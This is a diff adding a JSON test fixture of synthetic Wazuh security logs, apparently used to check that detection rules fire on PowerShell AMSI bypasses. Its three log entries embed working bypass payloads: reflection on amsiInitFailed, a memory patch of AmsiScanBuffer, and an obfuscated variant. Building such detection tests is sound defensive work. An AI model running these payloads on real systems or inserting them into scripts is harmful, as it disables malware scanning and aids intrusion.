@@ -1,0 +1,200 @@
+{
+  "_metadata": {
+    "attack_id": "T1562.001",
+    "variation": "002",
+    "name": "AMSI Bypass Techniques",
+    "description": "Attacker bypasses AMSI to evade PowerShell security scanning",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "defense-evasion",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "AMSI bypass via reflection",
+      "sequence": 1,
+      "timestamp": "2026-02-04T15:00:00.000Z",
+      "log": {
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 4104: AMSI Bypass via Reflection",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1562.001"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Disable or Modify Tools"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event4104",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000001.562001001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4104",
+              "channel": "Microsoft-Windows-PowerShell/Operational",
+              "providerName": "Microsoft-Windows-PowerShell",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "messageNumber": "1",
+              "messageTotal": "1",
+              "scriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+              "scriptBlockId": "amsi-bypass-001"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1562.001",
+        "_fomorian_batch": "campaign8-powerstrike"
+      }
+    },
+    {
+      "_comment": "AMSI bypass via memory patching",
+      "sequence": 2,
+      "timestamp": "2026-02-04T15:00:05.000Z",
+      "log": {
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 4104: AMSI Memory Patching",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1562.001"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Disable or Modify Tools"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event4104",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000001.562001002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4104",
+              "channel": "Microsoft-Windows-PowerShell/Operational",
+              "providerName": "Microsoft-Windows-PowerShell",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "messageNumber": "1",
+              "messageTotal": "1",
+              "scriptBlockText": "$Win32 = @\"\nusing System;using System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string n);\n    [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n    [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);\n}\n\"@\nAdd-Type $Win32\n$a = [Win32]::LoadLibrary(\"amsi.dll\")\n$b = [Win32]::GetProcAddress($a, \"AmsiScanBuffer\")\n[Win32]::VirtualProtect($b, [uint32]5, 0x40, [ref]0)\n$p = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $b, 6)",
+              "scriptBlockId": "amsi-bypass-002"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1562.001",
+        "_fomorian_batch": "campaign8-powerstrike"
+      }
+    },
+    {
+      "_comment": "AMSI bypass via string obfuscation",
+      "sequence": 3,
+      "timestamp": "2026-02-04T15:00:10.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 4104: Obfuscated AMSI Bypass",
+          "id": "100916",
+          "mitre": {
+            "id": [
+              "T1562.001"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "Disable or Modify Tools"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event4104",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000001.562001003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4104",
+              "channel": "Microsoft-Windows-PowerShell/Operational",
+              "providerName": "Microsoft-Windows-PowerShell",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "messageNumber": "1",
+              "messageTotal": "1",
+              "scriptBlockText": "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zx\" ) -VaL )::\"LO`Ad\"( \"amsi.dll\" )",
+              "scriptBlockId": "amsi-bypass-003"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1562.001",
+        "_fomorian_batch": "campaign8-powerstrike"
+      }
+    }
+  ]
+}
